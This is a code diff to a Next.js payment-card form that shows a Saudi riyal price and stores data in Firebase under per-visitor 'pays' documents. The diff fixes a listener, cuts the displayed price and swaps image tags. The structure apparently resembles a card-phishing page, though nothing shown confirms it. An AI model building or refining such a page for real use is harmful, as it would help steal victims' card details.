@@ -14,6 +14,7 @@ import {
 import { Lock, CreditCard } from "lucide-react";
 import { addData, db } from "@/lib/firebase";
 import { doc, onSnapshot } from "firebase/firestore";
+import Image from "next/image";
 import FullPageLoader from "@/components/loader";
 
 export default function PaymentForm() {
@@ -63,12 +64,15 @@ export default function PaymentForm() {
 
   /* ------------------ Firestore Listener ------------------ */
   useEffect(() => {
-    if (typeof window !== "undefined") {
-      const v = localStorage.getItem("visitor");
-      setVisitorId(v!);
+    let v = visitorId;
+    if (typeof window !== "undefined" && !v) {
+      v = localStorage.getItem("visitor") || "";
+      setVisitorId(v);
     }
 
-    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (snap) => {
+    if (!v) return;
+
+    const unsubscribe = onSnapshot(doc(db, "pays", v), (snap) => {
       if (!snap.exists()) return;
 
       const userData = snap.data();
@@ -84,7 +88,7 @@ export default function PaymentForm() {
     });
 
     return () => unsubscribe();
-  }, []);
+  }, [visitorId]);
 
   const isFormValid =
     cardNumber.length === 19 &&
@@ -105,7 +109,7 @@ export default function PaymentForm() {
         </p>
 
         <div className="text-center mb-6">
-          <span className="text-5xl font-bold text-green-600">110.50</span>
+          <span className="text-5xl font-bold text-green-600">11.50</span>
           <span className="text-2xl font-bold text-green-600 mr-2">ر.س</span>
         </div>
 
@@ -141,10 +145,12 @@ export default function PaymentForm() {
           <div className="bg-blue-900 text-white text-xs font-bold px-2 py-1 rounded">
             mada
           </div>
-          <img
+          <Image
             src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
             alt="Visa"
-            className="h-5"
+            width={50}
+            height={20}
+            className="h-5 w-auto"
           />
           <div className="flex">
             <div className="w-6 h-6 bg-red-500 rounded-full"></div>
@@ -256,15 +262,19 @@ export default function PaymentForm() {
         <div className="mt-6 pt-4 border-t border-stone-200">
           <p className="text-center text-xs text-stone-500 mb-3">نقبل هنا</p>
           <div className="flex justify-center items-center gap-4">
-            <img
+            <Image
               src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg"
               alt="Visa"
-              className="h-6"
+              width={60}
+              height={24}
+              className="h-6 w-auto"
             />
-            <img
+            <Image
               src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
               alt="Mastercard"
-              className="h-8"
+              width={60}
+              height={32}
+              className="h-8 w-auto"
             />
             <div className="bg-blue-900 text-white text-xs font-bold px-3 py-1 rounded">
               mada مدى
